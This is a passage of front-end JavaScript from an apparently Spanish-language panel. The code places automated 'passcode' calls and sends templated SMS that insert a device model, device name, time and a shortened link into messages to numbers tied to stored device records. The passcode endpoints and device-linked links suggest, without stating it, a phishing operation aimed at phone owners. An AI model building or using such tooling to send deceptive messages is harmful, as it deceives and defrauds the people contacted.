                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                      $("#callloader").html(html)   
                       updatecreditos_call();
                      clearInterval(timeValue);
                    }else if(ajaxprocesscall(res.idcall, res.cantcall) == "canceled" ){
                      $("#btncancelledcall").removeClass("disabled");
                      html = '';
                      html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">c</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">l</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                     $("#callloader").html(html)  
                     clearInterval(timeValue); 
                   }else if(ajaxprocesscall(res.idcall, res.cantcall) == "no-answer"){
                      $("#btncancelledcall").removeClass("disabled");  
                       html = '';
                       html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">c</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">l</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                      $("#callloader").html(html)  
                      clearInterval(timeValue);
                   }else if(ajaxprocesscall(res.idcall, res.cantcall) == "failed"){
                      $("#btncancelledcall").removeClass("disabled");
                        html = '';
                         html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">c</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">l</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                      $("#callloader").html(html)  
                      clearInterval(timeValue); 
                 }
          
               }, 3000);

            

          }else if(res.credito == false){

             html = '';

             $("#callloader").html(html)
             $('#selecmetodo').prop('selectedIndex',0);  
             
             Toast.fire({
               type: 'error',
               title: '&nbsp; No dispone de suficiente credito para realizar la llamada.<br>Consulta a su administrador.'
             })             

           }



   
    }).fail(function ajaxError(e){
        console.log(e);
    }).always(function ajaxSiempre(){
      
    })
    return false;

  }
 } 



})



function ajaxprocesscall(idcall, cantcall){

   var response = ""; 

     var data_form = {
        idcall   : idcall,
        cantcall : cantcall
      } 

     var url_php = '../api/passcode/passcode/procesarcall'; 
    $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: false, 
    }).done(function ajaxDone(res){
        
        console.log(count_call);
        
        if(count_call == 25 && res.statuscall == 'queued'){
            
            cancelar_la_llamada(idcall)
            
        }else if(count_call == 25 && res.statuscall == 'ringing'){
            cancelar_la_llamada(idcall)
        }else if(count_call == 10 && res.statuscall == ''){
            $("#callloader").html("")
            html = '';
            html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>';
            $("#callloader").html(html)
            $('#modalLlamadas').modal('hide') 
            window.location.reload()
        }

       response  = res.statuscall;
       if(response == "completed" || response == "answered"){
        $("#cantidadcallicon").html(res.credcall);
       }     
       
    count_call++;
    }).fail(function ajaxError(e){
        console.log(e);
    }).always(function ajaxSiempre(){
        console.log('Final de la llamada ajax.');
    })
    return response;
}

function cancelar_la_llamada(id){
      count_call = 0;
       var data_form = {
            idcall: id
         }


         var url_php = '../api/passcode/passcode/cancelarcall';

         $.ajax({
            type: 'POST',
            url: url_php,
            data: data_form,
            dataType: 'json',
            async: false,
         }).done(function ajaxDone(res) {

            if (res.status2 == "cancelled") {

               $("#callloader").html("")
               html = '';
               html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>';
               $("#callloader").html(html)

               $('#modalLlamadas').modal('hide')

            }else{
               $('#modalLlamadas').modal('hide')
            }


         })   
}


function updatecreditos_call(){
   
    $.ajax({
        type:'POST',
        url: '../api_rest/updatecreditos_call',
        data: '',
        dataType: 'json',
        async: true, 
    }).done(function ajaxDone(resp){

      $("#saldo_total").html(parseFloat(respuesta['creditos']).toFixed(2));

    })

}


 


  $("#id_apisms_sender").on('change', function(){

     allsenderid($("#id_apisms_sender").val())

  })

   function allsenderid(id_apisms){
      
     let data_form = {
         id_apisms : id_apisms
     } 

    $.ajax({
     
      url:"/configurar/smsapi/getsendersid",
      type:"POST",
      data:data_form,
      dataType: 'json',
      success:function(resp){
          $("#sender_id").html('');
          $.each(resp, function(index, value){

             $("#sender_id").append("<option value = "+value.idsender+">"+value.descripcion_cliente+"</option>")
          })        

      } 
    })  

   }

function smssender(id, idequipos){
   
     $("#modalsmssender").modal('show');
     $("#loader-modal-body-smssender").show();
    $(".form-smssender").hide()


    $("#msg_sms").val("");
    $("#prefijo_sms").val("")
    $("#numero_sms").val("")
    urlacortada_temp = ""
    link_short_temp  = ""
    link_long_temp   = ""
    modelo_temp      = ""
    niphone_temp     = ""
    $(".form-smssender")[0].reset();

    
    if(idequipos == 0){

         let datos = {
            id : id
          }

         $.ajax({
            type: 'POST',
            url: '/codigoacceso/getpasscode',
            data: datos,
            dataType: 'json',
            async: true
         }).done(function ajaxDone(resp) {

            $("#loader-modal-body-smssender").hide();
           $(".form-smssender").show()

     //console.log(resp)
           $("#prefijo_sms").val(resp['prefijo'])
           $("#numero_sms").val(resp['numero'])

         })      


    }else{

         let datos = {
            idequipos : idequipos
          }
   
         $.ajax({
            type: 'POST',
            url: '../equipos/getingresado',
            data: datos,
            dataType: 'json',
            async: true
         }).done(function ajaxDone(resp) {

             $("#loader-modal-body-smssender").hide();
           $(".form-smssender").show()

     //console.log(resp)
           $("#prefijo_sms").val(resp['pais'])
           $("#numero_sms").val(resp['numero'])
           urlacortada_temp = resp['urlacortada']
           link_short_temp  = resp['link_short']
           link_long_temp   = resp['link_long']
           modelo_temp      = resp['modelo']
            niphone_temp    = resp['niphone']

         })

   }

}


$("#plantilla_sms").on('change', function(){

   console.log('aqui' + " - " + urlacortada_temp + " - " + link_short_temp + " - " + link_long_temp + " - " + modelo_temp + " -" +niphone_temp)
    
    let urlacortada_op = '';
    if(urlacortada_temp == 'acortada'){
      urlacortada_op = 'https://'+link_short_temp;
    }else{
      urlacortada_op = 'https://'+link_long_temp;  
    }
    let plantilla_sms = $("#msg_sms").val($("#plantilla_sms").val().replace(/{{model}}/g,modelo_temp)
                                                                   .replace(/{{device}}/g,niphone_temp)
                                                                   .replace(/{{time}}/g,date_temp)
                                                                   .replace(/{{link}}/g,urlacortada_op));


})


$(document).on('submit', '.form-smssender', function(event){
   

    event.preventDefault();

    const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 4500
    }); 

    $(".alert-success_sms").hide()
    $(".alert-danger_sms").hide()

    $("#loader-modal-body-smssender").show();
    $(".form-smssender").hide()
     const HTTP = axios.create({
        baseURL: dominio
    })

    let datos = {
      id_apisms   : $("#id_apisms_sender").val(),
      sender_id   : $("#sender_id").val(),
      prefijo_sms : $("#prefijo_sms").val(),
      numero_sms  : $("#numero_sms").val(),
      msg_sms     : $("#msg_sms").val()
    }

   

    HTTP.post("/api_rest/enviar_sms", datos)
         .then(resp => {

           // $('.modal-body-remove').html("");

            let respuesta = resp.data;
            $("#loader-modal-body-smssender").hide();
            $(".form-smssender").show()
            if(respuesta['status'] == 'success' && respuesta['code'] == 200){
              
              Toast.fire({
                  type: 'success',
                  title: respuesta['msg_status']
              })

            }else if(respuesta['status'] == 'failed' && respuesta['code'] == 500){

             Toast.fire({
                  type: 'error',
                  title: respuesta['msg_status']
              })
            }else if(respuesta['status'] == 'failed_server' && respuesta['code'] == 301){

             Toast.fire({
                  type: 'error',
                  title: respuesta['msg_status']
              })
            }else{
              Toast.fire({
                  type: 'error',
                  title: respuesta['msg_status']
              })
            }
            
            $("#cantidadsmsicon").html(respuesta['creditos']);
           

           

         })


})



      
      
            
      
         
</script>
</body>
</html>